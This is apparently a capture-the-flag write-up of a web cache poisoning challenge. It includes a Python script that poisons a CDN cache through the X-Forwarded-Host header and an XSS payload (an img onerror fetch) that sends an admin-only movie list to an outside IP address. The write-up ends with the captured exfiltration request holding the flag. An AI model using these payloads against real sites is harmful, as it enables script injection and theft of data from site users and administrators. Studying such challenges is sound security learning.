After access this site, find a strange header: 

```
HTTP/1.1 200 OK
Server: gunicorn/19.9.0
Date: Mon, 17 Sep 2018 12:39:10 GMT
Content-Length: 523
Content-Type: application/octet-stream
Last-Modified: Fri, 14 Sep 2018 03:54:50 GMT
Cache-Control: public, max-age=43200
Expires: Tue, 18 Sep 2018 00:39:10 GMT
ETag: "1536897290.0-523-1486424030"
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD, OPTIONS, GET
Access-Control-Max-Age: 21600
Access-Control-Allow-Headers: X-Forwarded-Host
X-Varnish: 147513532
Age: 0
Via: 1.1 varnish-v4
Accept-Ranges: bytes
Connection: keep-alive
Proxy-Connection: keep-alive
```

Guess it may be a Web Cache Poison attack, and we can also find the following content in response:

```json
{
    "admin": false,
    "movies": [
        ...
        {
            "admin_only": true,
            "length": "22 Hours, 17 Minutes",
            "name": "[REDACTED]",
            "year": 2018
        }
    ]
}
```

So it's clear that we can get flag by poison the cache and then report it to admin. 

To get the movie list, we can add ``<img src=x onerror="fetch('http://123.206.65.192/'+'{{#movies}}{{ name }}{{/movies}}')">`` to the main.mst and put it on our server, then poison cache with the following script:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

host = 'ourip' 

while True:
    r = requests.get("http://d05dfb9b052433fb53dbc435cc82838b069d9e2e.hm.vulnerable.services/cdn/app.js", headers={'X-Forwarded-Host': host})
    if host in r.content:
        print 'success'
        break
``` 

One thing we need be careful is that we should add cors headers to allow ``hm.vulnerable.services`` fetch our site.

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD, OPTIONS, GET
Access-Control-Max-Age: 21600
Access-Control-Allow-Headers: X-Forwarded-Host
```

After success, just report it, and we will receive the flag on our server.

```
GET /WarGamesKung%20FurySneakersSwordfishThe%20Karate%20KidGhost%20in%20the%20ShellSerial%20Experiments%20LainThe%20MatrixBlade%20RunnerBlade%20Runner%202049HackersTRONTron:%20LegacyMinority%20ReporteXistenZflag%7BI_h0pe_you_w4tch3d_a11_th3_m0v1es%7D
```
